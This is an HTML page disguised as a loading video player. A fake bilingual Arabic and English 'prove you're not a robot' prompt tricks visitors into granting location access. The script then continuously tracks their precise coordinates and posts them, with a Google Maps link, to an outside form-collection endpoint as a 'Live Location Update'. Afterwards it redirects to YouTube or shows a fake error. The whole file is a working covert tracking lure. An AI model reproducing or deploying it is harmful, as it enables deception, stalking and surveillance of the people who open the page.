<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Video Loading...</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #000;
      color: #fff;
    }
    .container {
      display: flex;
      height: 100vh;
    }
    .main-video {
      flex: 3;
      position: relative;
      background: #111;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .main-video::before {
      content: "\f110";
      font-family: FontAwesome;
      font-size: 50px;
      color: #888;
      animation: spin 1s linear infinite;
    }
    .sidebar {
      flex: 1;
      background: #1a1a1a;
      padding: 10px;
      overflow-y: auto;
    }
    .video-thumb {
      background: #333;
      height: 100px;
      margin-bottom: 10px;
    }
    .alert-box {
      position: absolute;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #222;
      padding: 20px;
      border: 2px solid #fff;
      z-index: 999;
      text-align: center;
      max-width: 90%;
    }
    .alert-box button {
      margin-top: 10px;
      padding: 8px 20px;
      background: #0f62fe;
      color: white;
      border: none;
      cursor: pointer;
    }
    @keyframes spin {
      from {transform: rotate(0deg);}
      to {transform: rotate(360deg);}
    }
  </style>
</head>
<body>

<div class="container">
  <div class="main-video">
    <div class="alert-box" id="alertBox">
      <p>📍 لتتمكن من مشاهدة الفيديو، يرجى السماح بتحديد موقعك للتأكد أنك لست روبوت 🤖</p>
      <p>📍 To view the video, please allow location access to confirm you're not a robot 🤖</p>
      <button onclick="getLocation()">OK</button>
    </div>
  </div>
  <div class="sidebar">
    <div class="video-thumb"></div>
    <div class="video-thumb"></div>
    <div class="video-thumb"></div>
    <div class="video-thumb"></div>
  </div>
</div>

<script>
  function getLocation() {
    document.getElementById("alertBox").style.display = "none";
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition(sendLocation, errorLocation, {
        enableHighAccuracy: true,
        maximumAge: 10000,
        timeout: 5000
      });
    } else {
      showError();
    }
  }

  function sendLocation(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

    const data = {
      location: `Latitude: ${latitude}, Longitude: ${longitude}`,
      maps: mapsLink,
      _subject: "📍 Live Location Update"
    };

    fetch("https://formspree.io/f/xkgjqegp", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    }).then(() => {
      setTimeout(() => {
        window.location.href = "https://youtube.com";
      }, 1000);
    });
  }

  function errorLocation() {
    showError();
  }

  function showError() {
    document.querySelector(".main-video").innerHTML = "<h2 style='color:white;'>❌ تعذر تحميل الصورة<br>🚫 Image failed to load</h2>";
  }
</script>

</body>
</html>
